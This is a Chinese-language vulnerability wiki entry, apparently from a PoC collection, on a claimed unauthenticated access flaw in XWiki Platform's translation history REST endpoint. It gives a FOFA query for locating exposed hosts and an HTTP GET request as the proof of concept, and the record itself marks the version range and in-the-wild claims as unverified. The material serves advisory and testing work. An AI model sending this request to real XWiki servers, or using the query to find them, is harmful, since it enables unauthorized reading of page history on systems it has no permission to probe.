---
source: "SourByte05/Vulnerability-Wiki-PoC"
title: "XWiki Platform 翻译文档历史权限检查缺失声称"
product: "XWiki Platform"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "两个版本区间缺OR分隔，文称<15.10.9/<16.3.0-rc-1"
prerequisites: "匿名请求；须私有文档ACL对照"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://github.com/SourByte05/Vulnerability-Wiki-PoC"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/XWiki/XWiki%20de-history%E6%8E%A5%E5%8F%A3%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE.md"
fofa: "body=\"data-xwiki-reference\""
fofa_unverified: "body="
id: "vw-e22c493ad48b1a092f263355"
entity_id: "ve-e22c493ad48b1a092f263355"
schema_version: "1"
---

# XWiki Platform 翻译文档历史权限检查缺失声称

## 条目说明

- 对象与具体问题：XWiki Platform；翻译文档历史权限检查缺失声称
- 版本、配置及部署条件：两个版本区间缺OR分隔，文称<15.10.9/<16.3.0-rc-1
- 认证与权限前提：匿名请求；须私有文档ACL对照
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 默认Main WebHome可能公开，返回历史不自动证明越权；需受限文档对照和敏感字段文本
- 在野已知/高危/广泛无证据出处，不宜套模板断言
- HTTP未代码围栏，缺CVE/原始公告及明确安全版本

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 漏洞描述

XWiki的de/ history接口存在未授权访问漏洞，未授权用户可通过该漏洞获取页面的每次修改、修改时间、版本号、修改的作者和版本注释等信息

## 影响版本

xwiki-platform >= 1.8.0, < 15.10.9 >= 16.0.0-rc-1, < 16.3.0-rc-1

## **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 原文提供部分细节 | 见技术资料 | 未独立核验 | 待来源核实 |

> 归档原表（原作者主张，未独立核验）：上表记录本库当前核验边界；下表保留归档中的公开情况和在野利用声明，不能据此认定本库已验证。
>
> | 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
> |------|-------|-------|------|
> | 是 | 已公开 | 已公开 | 已知 |

### 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

## 漏洞复现

FOFA：body="data-xwiki-reference"

POC/EXP：

```http
GET /xwiki/rest/wikis/xwiki/spaces/Main/pages/WebHome/translations/de/history HTTP/1.1
Host: 127.0.0.1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
```


![image-20250225141758428](./.resource/XWikide-history接口未授权访问/media/image-20250225141758428.png)


## 漏洞修复

关注厂商官网动态，及时更新补丁信息。


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
